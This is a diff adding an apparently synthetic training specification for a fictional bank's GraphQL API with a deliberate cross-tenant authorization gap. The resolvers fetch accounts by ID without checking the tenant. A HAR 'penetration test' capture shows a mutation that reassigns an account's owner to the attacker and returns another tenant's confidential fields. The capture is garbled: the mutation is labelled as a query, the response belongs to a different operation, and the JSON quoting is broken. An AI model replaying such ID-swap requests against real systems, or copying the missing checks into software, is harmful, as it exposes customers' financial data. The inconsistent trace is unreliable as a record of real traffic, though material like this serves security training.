@@ -1,0 +1,131 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** NexaBank Open Finance API
+**Document Version:** 2.9.9 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** Financial Services / Retail Banking
+**Architecture:** ISO 20022 + REST/GraphQL over account ledgers
+**Training Example ID:** GQL-0152
+
+## 1.0 Executive Summary
+NexaBank Open Finance API is a financial services / retail banking platform that exposes a GraphQL API to authorised consumers.
+The platform manages financial records partitioned by tenant (`tenantId`). The architecture uses
+JWT-based OAuth2 authentication, and the JWT carries both the `sub` (user ID) and `tenantId` claims.
+Authorization is expected to be enforced per-resolver on the GraphQL server.
+
+## 2.0 Architecture Overview
+- **API Layer:** GraphQL single endpoint (`POST /graphql`) served via Apollo Server
+- **Auth:** OAuth2 JWT issued by internal IdP; claims include `sub`, `role`, `tenantId`
+- **Database:** PostgreSQL with row-level security policies; each table has a `tenant_id` column
+- **Caching:** Redis cache keyed by `accountId` (NOTE: no user dimension in cache key)
+
+## 3.0 GraphQL Schema
+```graphql
+
+type Account {
+  accountId: ID!
+  tenantId: ID!
+  ownerId: ID!
+  status: String!
+  data: AccountData
+  transactions: [Transaction!]
+}
+
+type AccountData {
+  title: String
+  sensitiveField: String      # PII / business-sensitive
+  internalNotes: String       # Internal-only field
+  auditLog: [AuditEntry!]
+}
+
+type Query {
+  getAccount(id: ID!): Account
+  listAccounts(tenantId: ID, status: String): [Account!]
+  getAccountWithChildren(id: ID!): Account
+}
+
+type Mutation {
+  updateAccount(id: ID!, input: AccountInput!): Account
+  deleteAccount(id: ID!): Boolean
+  bulkAccountLookup(ids: [ID!]!): [Account!]
+}
+
+```
+
+## 4.0 Known Architectural Notes
+- **RISK-GQL-152:** The `getAccount` resolver fetches by `accountId` only.
+  The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`.
+  Tracked internally as a known gap pending remediation.
+- The `bulkAccountLookup` mutation accepts an arbitrary array of IDs without
+  per-ID ownership filtering.
+
+## 5.0 Vulnerability Context
+**Pattern:** 10.1 — ID swap in own request (Single-User)
+
+The `accountId` field is used as the object identifier across all resolvers.
+A single authenticated user substitutes their own valid `accountId` with a victim's `accountId`. With one token, data belonging to another user is accessible.
+
+## 6.0 HAR Capture (Network Trace)
+The following HTTP Archive (HAR) capture was recorded during a penetration test.
+The attacker's token belongs to `tenant-404b` but the requested object belongs to `tenant-4b6d`.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {"name": "SecurityProxy", "version": "1.0"},
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:22:35.732496+00:00",
+        "time": 127,
+        "request": {
+          "method": "POST",
+          "url": "https://api.nexabank-open-financ.example.com/graphql",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            {"name": ":authority", "value": "api.nexabank-open-financ.example.com"},
+            {"name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-tenant-id", "value": "tenant-404b"}
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"query\": \"query VulnerableOp { updateAccount(id: "A-2152", input: {status: "approved", ownerId: "attacker-404b4b6d"}) { accountId status } }\"}"
+          },
+          "bodySize": 136
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-request-id", "value": "req-404b4b6d"}
+          ],
+          "content": {
+            "size": 211,
+            "mimeType": "application/json",
+            "text": "{\"data\": {\"getAccount\": {\"tenantId\": \"tenant-4b6d\", \"ownerId\": \"other-user-404b4b6d\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-404b4b6d\", \"internalNotes\": \"Internal data exposed\"}}}}"}"
+          },
+          "bodySize": 221,
+          "redirectURL": "",
+          "headersSize": 120
+        },
+        "timings": {"send": 2, "wait": 97, "receive": 5},
+        "cache": {}
+      }
+    ]
+  }
+}
+```
+
+## 7.0 API Contract (Partial)
+```
+POST /graphql
+Authorization: Bearer <JWT>
+Content-Type: application/json
+
+Body: { "query": "..." }
+
+Authenticated user's tenantId is extracted from JWT.
+Resolver MUST cross-check tenantId against fetched object's tenantId.
+```
